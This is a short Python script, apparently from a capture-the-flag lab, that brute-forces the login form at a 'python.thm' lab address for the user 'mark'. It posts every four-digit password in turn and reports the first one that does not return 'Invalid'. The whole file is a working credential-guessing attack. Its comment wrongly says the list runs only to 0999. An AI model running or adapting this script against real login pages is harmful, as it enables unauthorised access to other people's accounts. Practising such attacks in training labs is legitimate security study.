import requests

url = "http://python.thm/labs/lab1/index.php"
username = "mark"

# Create a list of 4-digit passwords from 0000 to 0999
password_list = [str(i).zfill(4) for i in range(10000)]

def burthforce():
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)  # fixed indentation

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")

burthforce()
